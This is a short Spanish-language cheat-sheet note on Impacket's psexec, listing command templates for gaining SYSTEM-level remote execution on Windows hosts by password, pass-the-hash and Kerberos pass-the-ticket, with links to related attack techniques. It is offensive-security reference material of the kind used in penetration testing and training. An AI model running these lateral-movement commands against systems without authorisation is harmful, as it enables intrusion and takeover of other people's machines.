---
title: psexec (Impacket)
resumen: Autenticarse en remoto con un usuario privilegiado y obtener ejecución como NT AUTHORITY\SYSTEM.
tags: remote-access
---

Herramienta que permite autenticarse en remoto en un equipo con un **usuario con privilegios administrativos**, obteniendo ejecución de comandos como `NT AUTHORITY\SYSTEM`. Es el clásico "PsExec de Sysinternals" reimplementado en Python por Impacket.

En Kali suele estar disponible en `/usr/bin` y también como script suelto en `/usr/share/doc/python3-impacket/examples/`.

### Acceder mediante contraseña

```bash
python3 psexec.py 'usuario'@IP        # ejecutado desde la ruta del script
impacket-psexec 'usuario'@IP
impacket-psexec 'usuario'@IP cmd.exe
impacket-psexec dominio.local/USUARIO:'PASS'@IP
```

### Acceder mediante hash (Pass the Hash)

```bash
impacket-psexec 'usuario'@IP -hashes ':hash'
impacket-psexec 'usuario'@IP -hashes 'hash'

impacket-psexec -debug 'netBIOS/Administrator@IP' -hashes 'hash'
impacket-psexec -debug 'dominio/usuario'@IP -hashes ':hash'
```

### Acceder mediante ticket Kerberos (Pass the Ticket, forest)

```bash
impacket-psexec child.dominio.local/Administrator@DC01.dominio.local -k -no-pass
```

### Técnicas donde aparece

[[pass-the-hash]] · [[pass-the-ticket]] · [[golden-ticket]] · [[conectarse-como-system]]
